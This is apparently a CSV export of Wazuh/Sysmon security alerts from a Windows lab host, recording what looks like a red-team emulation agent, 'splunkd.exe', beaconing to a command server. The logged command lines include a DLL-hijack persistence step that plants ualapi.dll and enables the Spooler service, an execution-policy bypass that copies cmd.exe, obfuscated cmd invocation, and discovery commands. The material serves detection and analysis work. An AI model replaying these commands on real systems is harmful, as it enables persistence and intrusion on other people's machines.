User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:02:58.418365600Z,57166,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,27,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:02:59.333",EventChannel,1732957379.2918225,"Nov 30, 2024 @ 09:02:59.333", , , , , , , , , , , , ,1984, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-D4C2-674A-6307-000000000D00},2024-11-30 09:02:58.409, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_grlsuhj0.tpi.ps1,2024-11-30 09:02:58.409, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,BPpLfJMBRlc-D5DF1SCf,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 08:59:14.678
ProcessGuid: {15959494-D3E2-674A-5807-000000000D00}
ProcessId: 6292
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net.exe  start 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=A22C23BE5AF113757D68691B10854375F0CE0EFB,MD5=15534275EDAABC58159DD0F8607A71E5,SHA256=E9739D544EE0D428696036CBD656C41DCC505B67CC43DBA7C6BEC4E3959282AC,IMPHASH=EB2C2924EA23E1A5FB0E3F53F46CB709
ParentProcessGuid: {15959494-D3E2-674A-5707-000000000D00}
ParentProcessId: 7296
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net.exe start >> %temp%\service-list.txt
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:59:14.679266700Z,57107,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:59:15.769",EventChannel,1732957155.2861992,"Nov 30, 2024 @ 08:59:15.769", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6292, , , , , , , , , , ,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", , , ,net.exe,C:\\Windows\\System32\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-D3E2-674A-5807-000000000D00},2024-11-30 08:59:14.678,"SHA1=A22C23BE5AF113757D68691B10854375F0CE0EFB,MD5=15534275EDAABC58159DD0F8607A71E5,SHA256=E9739D544EE0D428696036CBD656C41DCC505B67CC43DBA7C6BEC4E3959282AC,IMPHASH=EB2C2924EA23E1A5FB0E3F53F46CB709","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D3E2-674A-5707-000000000D00},cmd.exe /C net.exe start &gt;&gt; %temp%\\service-list.txt,0x107a6b,7296,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,net.exe  start,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,BfpLfJMBRlc-D5DF1SCf,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 08:59:14.685
ProcessGuid: {15959494-D3E2-674A-5907-000000000D00}
ProcessId: 5456
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  start 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=DC6E267A6BF85702F2DD52CB55F0967E2DB7E80D,MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888,IMPHASH=5322AC1A3CFF9C8A2AE16A789E26231E
ParentProcessGuid: {15959494-D3E2-674A-5807-000000000D00}
ParentProcessId: 6292
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net.exe  start 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:59:14.686240400Z,57108,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:59:15.801",EventChannel,1732957155.2867884,"Nov 30, 2024 @ 08:59:15.801", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5456, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\System32\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-D3E2-674A-5907-000000000D00},2024-11-30 08:59:14.685,"SHA1=DC6E267A6BF85702F2DD52CB55F0967E2DB7E80D,MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888,IMPHASH=5322AC1A3CFF9C8A2AE16A789E26231E","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D3E2-674A-5807-000000000D00},net.exe  start,0x107a6b,6292,C:\\Windows\\system32\\,C:\\Windows\\System32\\net.exe,C:\\Windows\\system32\\net1  start,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,P_pZfJMBRlc-D5DFJCAL,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-11-30 09:13:46.031
ProcessGuid: {15959494-D749-674A-8007-000000000D00}
ProcessId: 3268
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\ProgramData\cmd.exe
CreationUtcTime: 2024-11-25 23:43:07.360
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:13:46.045680200Z,57386,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,6,Executable file created by powershell: C:\\ProgramData\\cmd.exe,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92203, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:47.197",EventChannel,1732958027.3151543,"Nov 30, 2024 @ 09:13:47.197", , , , , , , , , , , , ,3268, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-D749-674A-8007-000000000D00},2024-11-30 09:13:46.031, , , , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\ProgramData\\cmd.exe,2024-11-25 23:43:07.360, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,QPpZfJMBRlc-D5DFJCAL,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 09:13:46.066
ProcessGuid: {15959494-D74A-674A-8107-000000000D00}
ProcessId: 4292
Image: C:\ProgramData\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\ProgramData\cmd.exe"" 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D749-674A-8007-000000000D00}
ParentProcessId: 3268
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""copy-item \""$env:windir\System32\cmd.exe\"" -destination \""$env:allusersprofile\cmd.exe\""; start-process \""$env:allusersprofile\cmd.exe\""; sleep -s 5 ; stop-process -name \""cmd\"" | out-null""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:13:46.068326600Z,57389,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,4,Powershell process spawned Windows command shell instance,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92004, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:13:47.229",EventChannel,1732958027.3154111,"Nov 30, 2024 @ 09:13:47.229", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4292, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\ProgramData\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-D74A-674A-8107-000000000D00},2024-11-30 09:13:46.066,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D749-674A-8007-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""copy-item \\\""$env:windir\\System32\\cmd.exe\\\"" -destination \\\""$env:allusersprofile\\cmd.exe\\\""; start-process \\\""$env:allusersprofile\\cmd.exe\\\""; sleep -s 5 ; stop-process -name \\\""cmd\\\"" | out-null\""",0x107a6b,3268,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\ProgramData\\cmd.exe\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,GvpRfJMBRlc-D5DFbyBS,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 09:05:19.951
ProcessGuid: {15959494-D54F-674A-6907-000000000D00}
ProcessId: 5688
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C copy %%windir%%\System32\amsi.dll %%APPDATA%%\amsi.dll && ren %%APPDATA%%\amsi.dll ualapi.dll && copy %%APPDATA%%\ualapi.dll %%windir%%\System32\ualapi.dll && sc config Spooler start=auto
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:05:19.953296200Z,57195,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,22,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:05:21.025",EventChannel,1732957521.2946928,"Nov 30, 2024 @ 09:05:21.025", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5688, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-D54F-674A-6907-000000000D00},2024-11-30 09:05:19.951,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C copy %%windir%%\\System32\\amsi.dll %%APPDATA%%\\amsi.dll &amp;&amp; ren %%APPDATA%%\\amsi.dll ualapi.dll &amp;&amp; copy %%APPDATA%%\\ualapi.dll %%windir%%\\System32\\ualapi.dll &amp;&amp; sc config Spooler start=auto,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,FPpPfJMBRlc-D5DF6CCl,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 09:03:45.916
ProcessGuid: {15959494-D4F1-674A-6507-000000000D00}
ProcessId: 1612
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! > hello.txt & type hello.txt
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:03:45.919035400Z,57180,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,20,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:03:47.003",EventChannel,1732957427.2921236,"Nov 30, 2024 @ 09:03:47.003", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,1612, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-D4F1-674A-6507-000000000D00},2024-11-30 09:03:45.916,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! &gt; hello.txt &amp; type hello.txt",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,KPpXfJMBRlc-D5DFnSBw,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 09:12:11.810
ProcessGuid: {15959494-D6EB-674A-7507-000000000D00}
ProcessId: 880
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C wevtutil enum-logs
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:12:11.813399000Z,57294,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,25,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:12:12.889",EventChannel,1732957932.3008054,"Nov 30, 2024 @ 09:12:12.889", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,880, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-D6EB-674A-7507-000000000D00},2024-11-30 09:12:11.810,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C wevtutil enum-logs,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,AvpLfJMBRlc-D5DFJSDT,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:58:31.745
ProcessGuid: {15959494-D3B7-674A-5607-000000000D00}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_bdbzyaeh.kol.ps1
CreationUtcTime: 2024-11-30 08:58:31.745
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:58:31.749595800Z,57099,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,23,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:58:32.889",EventChannel,1732957112.2852773,"Nov 30, 2024 @ 08:58:32.889", , , , , , , , , , , , ,7576, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-D3B7-674A-5607-000000000D00},2024-11-30 08:58:31.745, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_bdbzyaeh.kol.ps1,2024-11-30 08:58:31.745, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,HvpSfJMBRlc-D5DFHyAX,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:06:12.975
ProcessGuid: {15959494-D584-674A-6B07-000000000D00}
ProcessId: 2068
Image: C:\Users\mari\AppData\Roaming\updater.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_cmzs3kz0.00n.ps1
CreationUtcTime: 2024-11-30 09:06:12.975
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:06:12.990377400Z,57212,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,28,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:06:14.154",EventChannel,1732957574.2972451,"Nov 30, 2024 @ 09:06:14.154", , , , , , , , , , , , ,2068, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Users\\mari\\AppData\\Roaming\\updater.exe, , , , , , ,{15959494-D584-674A-6B07-000000000D00},2024-11-30 09:06:12.975, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_cmzs3kz0.00n.ps1,2024-11-30 09:06:12.975, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
